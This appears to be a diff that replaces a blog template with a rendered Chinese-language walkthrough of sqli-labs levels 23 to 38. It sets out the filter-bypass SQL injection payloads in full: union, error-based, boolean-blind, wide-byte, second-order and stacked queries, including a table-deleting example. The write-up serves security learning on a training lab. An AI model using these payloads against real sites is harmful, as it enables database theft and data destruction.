@@ -1,37 +1,1157 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
 
-{% block page_class %}page-post-detail{% endblock %}
+  
 
 
-{% block content %}
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="sqlilab," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Less-23查看源码 12345$reg &#x3D; &quot;&#x2F;#&#x2F;&quot;;$reg1 &#x3D; &quot;&#x2F;--&#x2F;&quot;;$replace &#x3D; &quot;&quot;;$id &#x3D; preg_replace($reg, $replace, $id);$id &#x3D; preg_replace($reg1, $replace, $id); preg_replace($reg, $replace,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-lab-Less-23">
+<meta property="og:url" content="http://example.com/sqli-lab-Less-23.html">
+<meta property="og:site_name" content="yzklov">
+<meta property="og:description" content="Less-23查看源码 12345$reg &#x3D; &quot;&#x2F;#&#x2F;&quot;;$reg1 &#x3D; &quot;&#x2F;--&#x2F;&quot;;$replace &#x3D; &quot;&quot;;$id &#x3D; preg_replace($reg, $replace, $id);$id &#x3D; preg_replace($reg1, $replace, $id); preg_replace($reg, $replace,">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/51.png">
+<meta property="og:image" content="http://example.com/img/52.png">
+<meta property="og:image" content="http://example.com/img/55.png">
+<meta property="og:image" content="http://example.com/img/53.png">
+<meta property="og:image" content="http://example.com/img/54.png">
+<meta property="og:image" content="http://example.com/img/56.png">
+<meta property="og:image" content="http://example.com/img/57.png">
+<meta property="og:image" content="http://example.com/img/58.png">
+<meta property="og:image" content="http://example.com/img/59.png">
+<meta property="og:image" content="http://example.com/img/60.png">
+<meta property="og:image" content="http://example.com/img/62.png">
+<meta property="og:image" content="http://example.com/img/61.png">
+<meta property="og:image" content="http://example.com/img/63.png">
+<meta property="article:published_time" content="2023-04-01T12:46:47.000Z">
+<meta property="article:modified_time" content="2023-07-24T11:00:03.497Z">
+<meta property="article:author" content="yzklov">
+<meta property="article:tag" content="sqlilab">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/51.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/sqli-lab-Less-23.html"/>
+
+
+
+
+
+  <title>sqli-lab-Less-23 | yzklov</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">yzklov</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">nanashi</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
 
   <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/sqli-lab-Less-23.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sqli-lab-Less-23</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-04-01T20:46:47+08:00">
+                2023-04-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><p>查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure>
+<p>preg_replace($reg, $replace, $id)大概意思是如果id传参中有$reg的值则将其代替为$replaced的值<br>在这里是将#和–+替代为空，即注释被过滤<br>我们可以使用<br><code>and &#39;1&#39;=&#39;1</code><br>因为id是单引号闭合的<br><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code><br>接下来的很简单了，可以使用联合注入、报错注入、布尔盲注、时间盲注</p>
+<h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入</p>
+<h4 id="第一步：插入恶意数据"><a href="#第一步：插入恶意数据" class="headerlink" title="第一步：插入恶意数据"></a>第一步：插入恶意数据</h4><p>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</p>
+<h4 id="第二步：引用恶意数据"><a href="#第二步：引用恶意数据" class="headerlink" title="第二步：引用恶意数据"></a>第二步：引用恶意数据</h4><p>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。<br>配合下图可以有更好的理解：</p>
+<h3 id="mysql-real-escape-string-—-转义-SQL-语句中使用的字符串中的特殊字符"><a href="#mysql-real-escape-string-—-转义-SQL-语句中使用的字符串中的特殊字符" class="headerlink" title="mysql_real_escape_string — 转义 SQL 语句中使用的字符串中的特殊字符"></a>mysql_real_escape_string — 转义 SQL 语句中使用的字符串中的特殊字符</h3><p>可以预防sql注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$curr_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span></span><br></pre></td></tr></table></figure>
+<p>可以看出只有username没有受到保护，所以我们注册受污染的用户名和正常的密码<br>当注册成功后账户密码存在到数据库的时候是没有转义的，以原本数据存入数据库的。当我们修改密码的时候，对于账户名是没有进行过滤的。<br>注册用户名：admin’# 密码：123123 ，修改密码为：123456<br>然后以管理员admin，密码123456登录成功<br>这一题好像有bug吧</p>
+<h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure>
+<p>and和or被过滤。，而且or&#x2F;i中的i表示此函数不区分大小写，所以AND和OR也被抹掉<br>那我们可以使用||和&amp;&amp;进行一个代替，但是&amp;&amp;在URL栏中有别的意思代表多个传参的意思，所以我们要进行一个URL编码<br>&amp;&amp;即为%26%26，如果理解没错的话||不需要编码，但是在information_schema中不能使用||来代替or，它们只是逻辑上相同<br>这个时候我们就得用双写法，即将information写成infoorrmation，函数只会抹去一个or，这一波我们在第二层<br><code>Less-25/?id=-1&#39;union select 1,2,table_name from infoorrmation_schema.tables where table_schema=&#39;security&#39;--+</code><br>在此之前的order别忘了双写<br>接下来使用联合注入就行了</p>
+<h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><p>这一题更恶心，过滤了许多字符<br>我们看一下源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个blacklist不就是黑名单的意思吗<br><code>\S 	匹配任何非空白字符</code><br>这里我们可以给一些地方添加括号来规避空格，使用双写来代替and和or，这里使用空格的URL编码好像不行<br>举个例子</p>
+<h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><p><code>||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;))),1))||&#39;0</code><br><img src="/img/51.png"><br>||可以用%7C%7C来替代</p>
+<h2 id="黑名单和白名单"><a href="#黑名单和白名单" class="headerlink" title="黑名单和白名单"></a>黑名单和白名单</h2><p>黑名单是不允许输什么，白名单是只允许输什么</p>
+<h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><p>查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这一关又过滤了一些东西</p>
+<h3 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h3><p><code>?id=1&#39;and(updatexml(1,concat(0x5e,database()),1)) and &#39;1&#39;=&#39;1</code></p>
+<h3 id="爆表名-1"><a href="#爆表名-1" class="headerlink" title="爆表名"></a>爆表名</h3><p><code>?id=1&#39;and%0aupdatexml(1,concat(0x5e,(selEct%0atable_name%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#39;security&#39;%0alimit%0a0,1)),1)and &#39;1&#39;=&#39;1</code></p>
+<h3 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h3><p><code>?id=1&#39;and%0aupdatexml(1,concat(0x5e,(selEct%0acolumn_name%0afrom%0ainformation_schema.columns%0awhere%0atable_schema=&#39;security&#39;and%0atable_name=&#39;users&#39;%0alimit%0a0,1)),1)and &#39;1&#39;=&#39;1</code></p>
+<h3 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h3><p><code>?id=1&#39;and%0aupdatexml(1,concat(0x5e,(selEct%0aid%0afrom%0aemails%0alimit%0a0,1)),1)and&#39;1&#39;=&#39;1</code></p>
+<h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><p>查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);					<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);	   		 	//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p><code>?id=1&#39;)and%0aupdatexml(1,concat(0x5e,database()),1)and(&#39;1&#39;)=(&#39;1</code><br>试了一下，不能使用报错注入<br>那我们就使用布尔盲注</p>
+<h3 id="猜库名长度"><a href="#猜库名长度" class="headerlink" title="猜库名长度"></a>猜库名长度</h3><p><code>?id=1&#39;)and(length(database()))=8%0aand(&#39;1&#39;)=(&#39;1</code></p>
+<h3 id="利用ASCII码猜解当前数据库名称"><a href="#利用ASCII码猜解当前数据库名称" class="headerlink" title="利用ASCII码猜解当前数据库名称"></a>利用ASCII码猜解当前数据库名称</h3><p><code>?id=1&#39;)and(ascii(substr(database(),1,1)))=115%0aand(&#39;1&#39;)=(&#39;1</code></p>
+<h3 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h3><p><code>?id=1&#39;)and(ascii(substr((select%0atable_name%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()%0alimit%0a0,1),1,1)))=101%0aand(&#39;1&#39;)=(&#39;1</code><br>这里不再详述了</p>
+<h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><h3 id="什么是宽字节"><a href="#什么是宽字节" class="headerlink" title="什么是宽字节"></a>什么是宽字节</h3><p>如果一个字符的大小是一个字节的，称为窄字节；如果一个字符的大小是两个字节的，成为宽字节<br>像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些编码都是常说的宽字节，也就是只有两字节<br>英文默认占一个字节，中文占两个字节</p>
+<h3 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h3><p>简单来说，宽字节注入就是将两个ascii字符误认为是一个宽字节字符<br>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字<br>常我们sql注入会输入id&#x3D;1’或id&#x3D;1’’进行测试，如果数据库过滤不严格就会产生报错，宽字节注入会在 ‘ 前加入 \，加入反斜线之后，起到一个转义作用，这样，存在的 ‘ 就会失去注入的功能。我们利用宽注入的原理，输入id&#x3D;1%df’，页面就会发生报错，这是因为GBK编码认为一个汉字占两个字节，\的url编码是%5C，加上 %df ，前面两个字符就会拼接为 %df%5c被识别为一个汉字。这样，\自动消失，转义作用在此失效。重新构造出来的汉字叫是真实存在但是浏览器不能很好识别的一个汉字。理论上可以不一定要使用%df，像%81 、%a1经测试也是可以实现的，只要能够重新构造出一个真实存在且不能被浏览器很好识别的汉字，并且编码能够包含%5c使\失效的字符都可以。</p>
+<p><code>?id=1%df&#39;and 1=1 --+</code><br><code>?id=1%df&#39;order by 4--+</code><br><code>?id=-1%df&#39;union select 1,table_name,3 from information_schema.tables where table_schema=database()--+</code><br><code>?id=-1%df&#39;union select 1,column_name,3 from information_schema.columns where table_schema=database()and table_name=0x656d61696c73--+</code><br>这里因为’会被\转义，所以查表名的时候可以使用database(),查列名的时候可以使用0x开头的16进制表示字符串emails，这样来规避’’被转义</p>
+<h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><p>Less-32是手动利用代码转义’，而33是用函数转义的<br><img src="/img/52.png"></p>
+<h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><p>这里是post型，不能使用get型的绕过<br>我们在输入框中输入的%df的%也会被编码<br><img src="/img/55.png"><br>那么我们在bp抓包后进行修改，宽字节注入，去闭合单引号<br><img src="/img/53.png"><br><img src="/img/54.png"></p>
+<h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>本关不用闭合<br><code>?id=1 order by 4 --+ ?id=-1 union select 1,2,3 --+ ?id=-1 union select 1,2,database() --+</code><br>后面查表名字段都只要使用0x16进制替代就行</p>
+<h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><p>这关和32关一样，只是函数不同<br><img src="/img/56.png"></p>
+<h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>这关和34关相同只是转义的函数改变<br>同样可以使用bp修改<br><img src="/img/57.png"></p>
+<h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><p><img src="/img/58.png"><br>这个函数很危险，支持多条查询，因此我们可以堆叠注入</p>
+<h3 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h3><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid&#x3D;1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
